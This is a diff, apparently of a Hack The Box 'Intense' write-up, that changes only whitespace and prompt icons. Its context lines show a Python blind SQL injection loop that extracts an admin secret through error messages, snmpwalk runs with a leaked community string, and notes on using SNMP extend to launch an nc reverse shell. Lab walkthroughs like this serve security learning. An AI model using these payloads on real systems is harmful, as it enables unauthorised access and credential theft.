@@ -506,11 +506,11 @@ def get_secret():
     print("The secret for admin is: ", sep="", end="", flush=True)
     for i in range(64):
         for char in string.printable:
-            
+
             #range(n) starts at 0 and ends at n-1, so need to add 1 when selecting which string location to brute force
             sql_query = "' AND (SELECT CASE WHEN ((SELECT hex(substr(secret,"+str(i+1)+",1)) FROM users WHERE role=1) = hex('"+str(char)+"')) THEN 1 ELSE MATCH(1,1) END))--"
             message = requests.post(url, cookies = { "auth" : guest_secret , "Referer" : referer }, data = { "message" : sql_query }).text
-            
+
             # since error messages start with the word "unable", use this to filter out the correct letter
             if not "unable" in message:
                 print(char, sep="", end="", flush=True)
@@ -670,7 +670,7 @@ installed snmp MIBs
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP>                                                   2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP>                                                   2 
 SNMPv2-MIB::sysDescr.0 = STRING: Linux intense 4.15.0-55-generic #60-Ubuntu SMP Tue Jul 2 18:22:20 UTC 2019 x86_64
 SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
 DISMAN-EVENT-MIB::sysUpTimeInstance = Timeticks: (5436351) 15:06:03.51
@@ -705,7 +705,7 @@ Not much information gained from SNMP walk
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                             130 ⨯ 2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                             130 ⨯ 2 
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutputFull."test1" = STRING: Hello, world!
@@ -733,7 +733,7 @@ created my command to send nc reverse shell
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING: /bin/nc: invalid option -- 'e'
@@ -759,7 +759,7 @@ Unfortunately the `nc` build on the target lacked `-e` support, so I couldn't ge
 
 ```text
 ┌──(kac0㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."command" = STRING:   File "<string>", line 1
@@ -778,7 +778,7 @@ NET-SNMP-EXTEND-MIB::nsExtendResult."test2" = INTEGER: 8960
 NET-SNMP-EXTEND-MIB::nsExtendResult."command" = INTEGER: 1
 
 ┌──(kac0㉿kali)-[~/htb/intense]
-└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 ⚙
+└─$ snmpwalk -v 2c -c SuP3RPrivCom90 <YOUR_IP> nsExtendOutput1                                   2 
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test1" = STRING: Hello, world!
 NET-SNMP-EXTEND-MIB::nsExtendOutput1Line."test2" = STRING: Hello, world!
 Timeout: No Response from <YOUR_IP>
@@ -938,7 +938,7 @@ ps -u root
    PID TTY          TIME CMD
      1 ?        00:00:04 systemd
      2 ?        00:00:00 kthreadd
-    
+
 ...snipped...
 
   1074 ?        00:00:00 note_server
